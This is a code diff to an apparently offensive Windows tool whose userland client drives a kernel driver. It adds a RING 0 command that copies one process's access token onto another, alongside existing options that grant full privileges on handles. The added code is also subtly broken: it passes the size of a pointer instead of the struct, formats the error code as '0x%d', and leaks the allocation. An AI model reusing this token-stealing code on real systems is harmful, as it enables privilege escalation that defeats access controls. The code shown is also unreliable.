@@ -38,6 +38,7 @@ int main(int argc, char * argv[])
 			"7: (RING 3) LIST KERNEL OBJECTS OF <int:PID>\n\t"
 			"8: (RING 0) SET FULL PRIVS ON <int:PID> <hex:handleID>\n\t"
 			"9: (RING 3) LIST KERNEL MODULES\n\t"
+			"10: (RING 0) BORROW A TOKEN FOR <int:PID> FROM <int:PID>\n\t"
 		);
 		return 1;
 	}
@@ -174,7 +175,7 @@ int main(int argc, char * argv[])
 		{
 			if (argc < 4)
 			{
-				printf("[-] address of kernel object to be modified required");
+				printf("[-] requires an address of the kernel object to be modified");
 				exit(1);
 			}
 
@@ -196,6 +197,28 @@ int main(int argc, char * argv[])
 		case 9: //CHECK LOADED KERNEL MODULES FROM USERLAND
 		{
 			listAllKernelDrivers();
+			break;
+		}
+		case 10: //BORROW A TOKEN FOR <pid> FROM <pid>
+		{
+			if (argc < 4)
+			{
+				printf("[-] requires <borrower pid> and <lender pid>");
+				exit(1);
+			}
+
+			int borrower = std::atoi(argv[2]);
+			int lender = std::atoi(argv[3]);
+
+			PTOKENX tokens = new TOKENX{borrower, lender};
+			if (success = DeviceIoControl(hDriver, IOCTL_BORROW_TOKEN, tokens, sizeof(tokens), nullptr, 0, nullptr, nullptr))
+			{
+				printf("[+] a token from [%d] was assigned to [%d]\n", lender, borrower);
+			}
+			else
+			{
+				printf("[-] error: 0x%d\n", GetLastError());
+			}
 			break;
 		}
 	}
